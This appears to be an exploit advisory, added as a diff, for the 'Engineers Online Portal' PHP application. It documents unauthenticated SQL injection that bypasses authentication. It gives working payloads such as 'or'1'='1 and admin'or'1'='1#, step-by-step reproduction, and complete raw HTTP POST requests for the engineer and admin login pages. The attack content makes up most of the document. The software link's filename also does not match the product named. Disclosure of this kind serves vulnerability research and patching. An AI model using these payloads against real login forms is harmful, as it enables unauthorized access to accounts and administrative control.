@@ -1,0 +1,63 @@
+# Title: Engineers Online Portal - 'Multiple' SQL Injection (Unauthenticated)
+# Exploit Author: Sentinal920 
+# Date: 2021-10-13
+# Vendor Homepage: https://www.sourcecodester.com/php/13115/engineers-online-portal-php.html
+# Version: 1
+# Software Link: https://www.sourcecodester.com/sites/default/files/download/oretnom23/nia_munoz_monitoring_system.zip
+# Tested On: Windows 10, XAMPP 
+# Vulnerable Parameters:  "username" , "password"
+
+Steps to Reproduce:
+
+A) SQL Injection (Authentication Bypass)
+To Login as Engineer
+
+1) Navigate to http://localhost/login.php
+2) Enter the payload into the username field as "'or'1'='1" without double-quotes and type "'or'1'='1" into the password field.
+3) Click on "Login" button and you are logged in as an engineer.
+
+Request:
+========
+
+POST /login.php HTTP/1.1                                                                                                                                         
+Host: localhost                                                                                                                                           
+Content-Length: 41                                                                                                                                               
+Accept: */*                                                                                                                                                      
+X-Requested-With: XMLHttpRequest                                                                                                                                 
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36                                   
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8                                                                                                   
+Origin: http://localhost                                                                                                                                   
+Referer: http://localhost                                                                                                                                 
+Accept-Encoding: gzip, deflate                                                                                                                                   
+Accept-Language: en-US,en;q=0.9                                                                                                                                  
+Connection: close                                                                                                                                                
+                                                                                                                                                                 
+username='or'1'%3D'1&password='or'1'%3D'1 
+
+
+--------------------------------------------------------------------------------
+
+B) SQL Injection (Authentication Bypass)
+To Login as Admin
+
+1) Navigate to http://localhost/admin/login.php
+2) Enter the payload into the username field as "admin'or'1'='1#" without double-quotes and type anything into the password field.
+3) Click on "Login" button and you are logged in as administrator.
+
+Request:
+========
+
+POST /admin/login.php HTTP/1.1                                                                                                                                   
+Host: localhost                                                                                                                                            
+Content-Length: 46                                                              
+Accept: */*                                                                                                                                                      
+X-Requested-With: XMLHttpRequest                                                                                                                                 
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8                  
+Origin: http://localhost        
+Referer: http://localhost                                      
+Accept-Encoding: gzip, deflate                                                  
+Accept-Language: en-US,en;q=0.9
+Connection: close                                                               
+                                                                                
+username=admin'or'1'%3D'1%23&password=anything
